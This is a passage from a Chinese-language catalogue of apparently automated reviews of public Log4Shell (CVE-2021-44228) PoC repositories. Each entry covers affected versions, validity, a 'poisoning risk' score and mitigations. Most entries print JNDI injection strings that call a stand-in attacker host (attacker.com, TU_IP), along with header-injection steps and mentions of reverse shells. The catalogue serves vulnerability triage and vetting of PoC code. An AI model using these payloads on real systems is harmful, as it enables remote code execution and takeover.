综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
